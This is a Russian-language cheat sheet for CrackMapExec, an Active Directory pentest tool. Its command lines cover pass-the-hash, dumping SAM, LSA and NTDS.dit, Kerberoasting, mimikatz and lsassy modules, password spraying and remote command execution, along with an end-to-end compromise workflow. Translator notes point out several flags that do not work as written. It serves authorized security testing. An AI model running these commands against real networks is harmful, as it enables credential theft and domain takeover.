<a id="-crackmapexec---ad-swiss-army-knife"></a>
# 🗡️ CrackMapExec — универсальный инструмент для тестирования AD

<!-- language-home-navigation -->
[🏠 Русская главная страница](../../README.ru.md) • [🌐 Languages](../../README.md#-available-languages)

[🇬🇧 Английский оригинал](../README.md) • [🏠 Русская главная](../../README.ru.md) • [🇮🇹 Versione Italiana](README.it.md) | [🇹🇷 Türkçe Sürüm](README.tr.md) • [🇬🇷 Ελληνικά](README.el.md)

```
   ██████╗███╗   ███╗███████╗
  ██╔════╝████╗ ████║██╔════╝
  ██║     ██╔████╔██║█████╗  
  ██║     ██║╚██╔╝██║██╔══╝  
  ╚██████╗██║ ╚═╝ ██║███████╗
   ╚═════╝╚═╝     ╚═╝╚══════╝
   CrackMapExec — универсальный инструмент для пентестинга
```

<p align="center">
  <img src="https://img.shields.io/badge/CrackMapExec-Active_Directory-red?style=for-the-badge" alt="CME">
  <img src="https://img.shields.io/badge/SMB-blue?style=for-the-badge" alt="SMB">
  <img src="https://img.shields.io/badge/WinRM-green?style=for-the-badge" alt="WinRM">
</p>

---

<a id="-table-of-contents"></a>
## 📋 Содержание

- [Что такое CrackMapExec](#-what-is-crackmapexec)
- [Установка](#-installation)
- [Протокол SMB](#-smb-protocol)
- [Протокол WinRM](#-winrm-protocol)
- [Протокол LDAP](#-ldap-protocol)
- [Протокол MSSQL](#-mssql-protocol)
- [Протокол SSH](#-ssh-protocol)
- [Модули](#-modules)
- [Password spraying — один пароль для нескольких учётных записей](#-password-spraying)
- [Краткий справочник](#-quick-reference)

---

<a id="-what-is-crackmapexec"></a>
## 🎯 Что такое CrackMapExec

**CrackMapExec** (CME) — инструмент для оценки сетей после получения первоначального доступа (post-exploitation). Он поддерживает:

- 🖥️ **SMB** — общие ресурсы, сеансы и выполнение команд
- 🔧 **WinRM** — удалённое управление PowerShell
- 📂 **LDAP** — сбор сведений об AD
- 🗄️ **MSSQL** — атаки на SQL Server
- 🐧 **SSH** — целевые системы Linux
- 💉 **Pass-the-Hash** — повторное использование учётных данных в виде хеша

<a id="features"></a>
### Возможности

| Возможность | Описание |
|---------|-------------|
| **Несколько протоколов** | SMB, WinRM, LDAP, MSSQL, SSH |
| **Параллельное выполнение** | Работа с несколькими целевыми узлами |
| **База учётных данных** | Учёт полученных учётных данных |
| **Модули** | Расширение собственными модулями |
| **Форматы вывода** | Разные варианты вывода |

---

<a id="-installation"></a>
## 🚀 Установка

> **Версии:** исходный CrackMapExec больше не поддерживается и его репозиторий архивирован. Сообщество продолжает развитие в NetExec; имена команд, параметры и модули различаются. Примеры CME и исходные ссылки здесь сохранены. Доступность пакетов apt/pipx зависит от среды. См. [архив CME](https://github.com/byt3bl33d3r/CrackMapExec) и [README NetExec](https://github.com/Pennyw0rth/NetExec).

<a id="kali-linux"></a>
### Kali Linux

```bash
# Установка через apt
sudo apt update
sudo apt install crackmapexec

# Или через pipx (рекомендуется)
pipx install crackmapexec
```

<a id="using-pipx"></a>
### С помощью pipx

```bash
# Сначала установите pipx
sudo apt install pipx
pipx ensurepath

# Установить CME
pipx install crackmapexec
```

<a id="verify"></a>
### Проверка

```bash
crackmapexec --help
crackmapexec smb --help
```

---

<a id="-smb-protocol"></a>
## 🖥️ Протокол SMB

<a id="basic-enumeration"></a>
### Базовый сбор сведений

```bash
# Проверить доступность узлов
cme smb 10.10.10.0/24

# Сбор сведений с учётными данными
cme smb 10.10.10.10 -u user -p password

# Доменная аутентификация
cme smb 10.10.10.10 -u user -p password -d domain.local

# Локальная аутентификация
cme smb 10.10.10.10 -u administrator -p password --local-auth
```

<a id="pass-the-hash"></a>
### Pass-the-Hash — аутентификация с использованием хеша

```bash
# SMB с хешем NTLM
cme smb 10.10.10.10 -u user -H NTLMHASH

# Полный хеш LM:NTLM
cme smb 10.10.10.10 -u user -H LM:NTLM

# Проверить хеш на узлах сети
cme smb 10.10.10.0/24 -u administrator -H NTLMHASH --local-auth
```

<a id="share-enumeration"></a>
### Перечисление общих ресурсов

> **Уточнение:** `--spider-folder` задаёт подкаталог для spidering, но не выбирает общий ресурс. В последней команде оригинала нет `--spider`, поэтому её нельзя считать самостоятельным рекурсивным обходом. См. [парсер SMB](https://github.com/byt3bl33d3r/CrackMapExec/blob/master/cme/protocols/smb/proto_args.py).

```bash
# Перечислить общие ресурсы
cme smb 10.10.10.10 -u user -p password --shares

# Поиск файлов в общих ресурсах
cme smb 10.10.10.10 -u user -p password --spider C$ --pattern txt

# Рекурсивно перечислить файлы
cme smb 10.10.10.10 -u user -p password --spider-folder /path --depth 3
```

<a id="user-enumeration"></a>
### Перечисление пользователей

```bash
# Перечислить пользователей через RPC
cme smb 10.10.10.10 -u user -p password --users

# Перечислить группы
cme smb 10.10.10.10 -u user -p password --groups

# Перечислить вошедших пользователей
cme smb 10.10.10.10 -u user -p password --loggedon-users

# Получить SID пользователей
cme smb 10.10.10.10 -u user -p password --rid-brute
```

<a id="command-execution"></a>
### Выполнение команд

```bash
# Выполнить команду
cme smb 10.10.10.10 -u admin -p password -x "whoami"

# Выполнение через PowerShell
cme smb 10.10.10.10 -u admin -p password -X "Get-Process"

# Разные способы выполнения
cme smb 10.10.10.10 -u admin -p password -x "whoami" --exec-method smbexec
cme smb 10.10.10.10 -u admin -p password -x "whoami" --exec-method wmiexec
cme smb 10.10.10.10 -u admin -p password -x "whoami" --exec-method atexec
cme smb 10.10.10.10 -u admin -p password -x "whoami" --exec-method mmcexec
```

<a id="credential-dumping"></a>
### Извлечение учётных данных

> **Права доступа:** требование «DA на DC» в исходном комментарии упрощено. Для метода DCSync существенны соответствующие права репликации, которые могут быть делегированы без членства в Domain Admins; метод VSS имеет другие административные предпосылки. См. [DCSync в документации SpecterOps](https://bloodhound.specterops.io/resources/edges/dc-sync).

```bash
# Извлечь SAM
cme smb 10.10.10.10 -u admin -p password --sam

# Извлечь секреты LSA
cme smb 10.10.10.10 -u admin -p password --lsa

# Извлечь NTDS.dit (требуются права DA на DC)
cme smb DC01.domain.local -u admin -p password --ntds

# Извлечь NTDS указанным способом
cme smb DC01 -u admin -p password --ntds drsuapi
cme smb DC01 -u admin -p password --ntds vss
```

<a id="smb-signing"></a>
### Подпись SMB

```bash
# Проверить подпись SMB (для атак с ретрансляцией)
cme smb 10.10.10.0/24 --gen-relay-list relay.txt
```

---

<a id="-winrm-protocol"></a>
## 🔧 Протокол WinRM

<a id="basic-usage"></a>
### Основы использования

```bash
# Проверить доступ через WinRM
cme winrm 10.10.10.10 -u user -p password

# Проверить несколько целевых узлов
cme winrm 10.10.10.0/24 -u user -p password

# С хешем
cme winrm 10.10.10.10 -u user -H NTLMHASH
```

<a id="command-execution-1"></a>
### Выполнение команд

```bash
# Выполнить команду
cme winrm 10.10.10.10 -u admin -p password -x "whoami"

# PowerShell
cme winrm 10.10.10.10 -u admin -p password -X "Get-Process"

# Выполнить сценарий
cme winrm 10.10.10.10 -u admin -p password -X '$PSVersionTable'
```

<a id="credential-dumping-1"></a>
### Извлечение учётных данных

```bash
# Извлечение SAM через WinRM
cme winrm 10.10.10.10 -u admin -p password --sam

# Секреты LSA
cme winrm 10.10.10.10 -u admin -p password --lsa
```

---

<a id="-ldap-protocol"></a>
## 📂 Протокол LDAP

<a id="enumeration"></a>
### Сбор сведений

```bash
# Базовый запрос LDAP
cme ldap DC01.domain.local -u user -p password

# Перечислить пользователей
cme ldap DC01 -u user -p password --users

# Перечислить группы
cme ldap DC01 -u user -p password --groups

# Пользователи, доступные для AS-REP roasting
cme ldap DC01 -u user -p password --asreproast asrep.txt

# Пользователи, доступные для Kerberoasting
cme ldap DC01 -u user -p password --kerberoasting kerb.txt
```

<a id="password-policy"></a>
### Политика паролей

> **Совместимость:** параметра `--password-policy` нет в парсере LDAP архивной версии CME; `--pass-pol` относится к SMB. Примеры здесь и в разделе блокировки сохранены как в оригинале. См. [LDAP](https://github.com/byt3bl33d3r/CrackMapExec/blob/master/cme/protocols/ldap/proto_args.py) и [SMB](https://github.com/byt3bl33d3r/CrackMapExec/blob/master/cme/protocols/smb/proto_args.py).

```bash
# Получить политику паролей
cme ldap DC01 -u user -p password --password-policy
```

<a id="user-attributes"></a>
### Атрибуты пользователей

```bash
# Получить описания пользователей
cme ldap DC01 -u user -p password -M get-desc-users

# Получить выбранные атрибуты
cme ldap DC01 -u user -p password --admin-count
```

---

<a id="-mssql-protocol"></a>
## 🗄️ Протокол MSSQL

<a id="basic-usage-1"></a>
### Основы использования

> **Аутентификация MSSQL:** в архивном CME режим SQL-аутентификации определяется `--local-auth`, тогда как без него используется аутентификация Windows. Поэтому пример с `sa` ниже не является универсально рабочим входом SQL. Команды сохранены; см. [реализацию MSSQL](https://github.com/byt3bl33d3r/CrackMapExec/blob/master/cme/protocols/mssql.py).

```bash
# Подключиться к MSSQL
cme mssql 10.10.10.10 -u sa -p password

# Аутентификация Windows
cme mssql 10.10.10.10 -u user -p password -d domain.local

# С хешем
cme mssql 10.10.10.10 -u user -H NTLMHASH -d domain.local
```

<a id="command-execution-2"></a>
### Выполнение команд

> **Совместимость:** `--enable-xp` отсутствует в парсере MSSQL архивной версии. Обработчик выполнения сам пытается включить xp_cmdshell; успех зависит от прав и настроек сервера. `-q` выполняет SQL-запрос, а не команду ОС. См. [парсер MSSQL](https://github.com/byt3bl33d3r/CrackMapExec/blob/master/cme/protocols/mssql/proto_args.py) и [MSSQLEXEC](https://github.com/byt3bl33d3r/CrackMapExec/blob/master/cme/protocols/mssql/mssqlexec.py).

```bash
# Выполнить через xp_cmdshell
cme mssql 10.10.10.10 -u sa -p password -x "whoami"

# Сначала включить xp_cmdshell
cme mssql 10.10.10.10 -u sa -p password --enable-xp

# Выполнить команду
cme mssql 10.10.10.10 -u sa -p password -q "SELECT @@version"
```

---

<a id="-ssh-protocol"></a>
## 🐧 Протокол SSH

<a id="basic-usage-2"></a>
### Основы использования

```bash
# Проверка SSH
cme ssh 10.10.10.10 -u root -p password

# Несколько целевых узлов
cme ssh 10.10.10.0/24 -u user -p password

# С файлом ключа
cme ssh 10.10.10.10 -u user --key-file id_rsa
```

<a id="command-execution-3"></a>
### Выполнение команд

```bash
# Выполнить команду
cme ssh 10.10.10.10 -u root -p password -x "id"

# Несколько команд
cme ssh 10.10.10.10 -u root -p password -x "cat /etc/passwd"
```

---

<a id="-modules"></a>
## 🧩 Модули

<a id="list-modules"></a>
### Список модулей

```bash
# Перечислить все модули
cme smb -L
cme winrm -L
cme ldap -L

# Справка по модулю
cme smb -M mimikatz --options
```

<a id="popular-modules"></a>
### Популярные модули

> **Модули:** список отражает оригинал. Наличие модуля и поддерживаемые протоколы зависят от установленной версии; одинаковые имена в CME и NetExec не гарантируют одинаковое поведение. См. [модули архивного CME](https://github.com/byt3bl33d3r/CrackMapExec/tree/master/cme/modules).

```bash
# Mimikatz
cme smb 10.10.10.10 -u admin -p password -M mimikatz

# Lsassy (извлечение LSASS)
cme smb 10.10.10.10 -u admin -p password -M lsassy

# WebDAV
cme smb 10.10.10.10 -u admin -p password -M webdav

# Petitpotam
cme smb 10.10.10.10 -u user -p password -M petitpotam

# Пароли GPP
cme smb DC01 -u user -p password -M gpp_password

# Автоматический вход GPP AutoLogon
cme smb DC01 -u user -p password -M gpp_autologin

# Spider Plus
cme smb 10.10.10.10 -u user -p password -M spider_plus
```

<a id="bloodhound-collection"></a>
### Сбор данных для BloodHound

> **Совместимость данных:** встроенный сборщик CME рассчитан на свою версию схемы BloodHound. Формат Legacy и Community Edition (CE) следует различать; наличие `--bloodhound` не гарантирует совместимость с любым сервером. См. [реализацию LDAP-сбора](https://github.com/byt3bl33d3r/CrackMapExec/blob/master/cme/protocols/ldap.py).

```bash
# Собрать данные для BloodHound
cme ldap DC01 -u user -p password --bloodhound -ns DC01 -c All
```

---

<a id="-password-spraying"></a>
## 🔓 Password spraying — один пароль для нескольких учётных записей

<a id="basic-spraying"></a>
### Базовый password spraying

> **Исправление подписи:** `--no-bruteforce` сопоставляет строки двух списков попарно: user1 с password1, user2 с password2. Это не перебор каждой комбинации, как сказано в исходном комментарии. См. [общий парсер CME](https://github.com/byt3bl33d3r/CrackMapExec/blob/master/cme/cli.py).

```bash
# Один пароль для нескольких пользователей
cme smb 10.10.10.10 -u users.txt -p 'Password123!' --continue-on-success

# Несколько паролей
cme smb 10.10.10.10 -u users.txt -p passwords.txt --continue-on-success

# Без полного перебора (попробовать каждую комбинацию)
cme smb 10.10.10.10 -u users.txt -p passwords.txt --no-bruteforce
```

<a id="network-spraying"></a>
### Password spraying по сети

```bash
# Password spraying по сети
cme smb 10.10.10.0/24 -u user -p 'Password123!' --continue-on-success

# Целевые узлы из файла
cme smb targets.txt -u admin -p password --continue-on-success
```

<a id="lockout-awareness"></a>
### Учёт блокировки учётных записей

```bash
# Сначала проверить политику паролей
cme ldap DC01 -u user -p password --password-policy

# Пример вывода:
# Minimum password length: 8
# Password history length: 24
# Lockout threshold: 5
# Lockout duration: 30 minutes
```

---

<a id="-database"></a>
## 💾 База данных

<a id="cme-database"></a>
### База данных CME

```bash
# Просмотреть учётные данные
cmedb

# Внутри cmedb:
creds           # Перечислить сохранённые учётные данные
hosts           # Перечислить просканированные узлы
```

<a id="export-data"></a>
### Экспорт данных

> **Уточнение:** `--log` предусмотрен общим парсером архивного CME, а параметр `--json` там отсутствует. Исходный пример JSON оставлен без изменений. См. [cme/cli.py](https://github.com/byt3bl33d3r/CrackMapExec/blob/master/cme/cli.py).

```bash
# Форматы вывода
cme smb 10.10.10.10 -u user -p password --log log.txt

# Вывод JSON
cme smb 10.10.10.10 -u user -p password --json
```

---

<a id="-quick-reference"></a>
## 📊 Краткий справочник

<a id="authentication-methods"></a>
### Способы аутентификации

| Способ | Параметр |
|--------|--------|
| Пароль | `-p password` |
| Хеш NTLM | `-H HASH` |
| Ключ AES | `--aesKey KEY` |
| Kerberos | `-k` |
| Локальная аутентификация | `--local-auth` |

<a id="protocols"></a>
### Протоколы

| Протокол | Порт | Применение |
|----------|------|----------|
| SMB | 445 | Общие файловые ресурсы, выполнение команд |
| WinRM | 5985/5986 | Удалённое управление PowerShell |
| LDAP | 389/636 | Сбор сведений об AD |
| MSSQL | 1433 | SQL Server |
| SSH | 22 | Системы Linux |

<a id="common-flags"></a>
### Основные параметры

| Параметр | Описание |
|------|-------------|
| `-u` | Имя пользователя (или файл) |
| `-p` | Пароль (или файл) |
| `-H` | Хеш NTLM |
| `-d` | Домен |
| `-x` | Команда (cmd) |
| `-X` | Команда (PowerShell) |
| `--shares` | Перечислить общие ресурсы |
| `--users` | Перечислить пользователей |
| `--sam` | Извлечь SAM |
| `--lsa` | Извлечь секреты LSA |
| `--ntds` | Извлечь NTDS |

<a id="output-markers"></a>
### Обозначения вывода

> **Значение маркера:** `(Pwn3d!)` отражает проверку привилегий для конкретного протокола, а не гарантирует полный контроль над машиной или доменом. Для MSSQL проверяется роль sysadmin. См. [реализацию MSSQL](https://github.com/byt3bl33d3r/CrackMapExec/blob/master/cme/protocols/mssql.py).

| Обозначение | Значение |
|--------|---------|
| `[+]` | Успех |
| `[-]` | Ошибка |
| `[*]` | Информация |
| `(Pwn3d!)` | Подтверждён административный доступ |

<a id="typical-workflow"></a>
### Типичная последовательность работы

```bash
# 1. Сканирование сети
cme smb 10.10.10.0/24

# 2. Password spraying
cme smb 10.10.10.0/24 -u users.txt -p 'Summer2024!' --continue-on-success

# 3. Проверить административный доступ
cme smb 10.10.10.0/24 -u user -p password

# 4. Извлечь учётные данные
cme smb 10.10.10.10 -u admin -p password --sam --lsa

# 5. Использовать найденные учётные данные
cme smb 10.10.10.0/24 -u newuser -H NEWHASH
```

---

<a id="-resources"></a>
## 📚 Ресурсы

- [CrackMapExec GitHub](https://github.com/Porchetta-Industries/CrackMapExec)
- [CrackMapExec Wiki](https://wiki.porchetta.industries/)
- [CME Modules](https://github.com/Porchetta-Industries/CrackMapExec/tree/master/cme/modules)

<a id="related-cheatsheets"></a>
### Связанные шпаргалки
- [BloodHound](../../BloodHound/translations/README.ru.md)
- [Impacket](../../Impacket/translations/README.ru.md)
- [Mimikatz](../../Mimikatz/translations/README.ru.md)

---

<p align="center">
  <b>🗡️ Получите контроль над сетью!</b><br>
  <i>CrackMapExec — универсальный инструмент пентестера</i>
</p>
